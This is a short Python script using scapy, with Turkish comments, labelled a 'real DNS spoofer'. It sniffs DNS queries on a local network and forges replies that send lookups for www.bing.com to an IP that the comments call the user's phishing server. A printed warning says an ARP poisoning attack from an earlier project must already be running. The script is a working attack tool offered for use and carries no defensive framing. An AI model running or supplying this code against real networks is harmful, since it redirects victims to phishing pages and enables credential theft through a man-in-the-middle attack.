from scapy.all import *

print("--- REAL DNS SPOOFER ---")
print("UYARI: Bu saldırı için önce ARP Poisoning (Proje 147) aktif olmalıdır.")

TARGET_DOMAIN = "www.bing.com"
FAKE_IP = "192.168.1.X" # Senin IP adresin (Phishing sunucusu)

def dns_reply(packet):
    # Sadece DNS Sorgularını yakala
    if packet.haslayer(DNSQR):
        query_name = packet[DNSQR].qname.decode()
        
        if TARGET_DOMAIN in query_name:
            print(f"[+] HEDEF YAKALANDI: {query_name} -> Yönlendiriliyor: {FAKE_IP}")
            
            # Sahte DNS Cevabı Oluştur
            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                          UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                          DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd, \
                              an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=FAKE_IP))
            
            send(spoofed_pkt, verbose=0)
            return "Spoofed"

print(f"[*] {TARGET_DOMAIN} için pusuya yatıldı...")
sniff(filter="udp port 53", prn=dns_reply, store=0)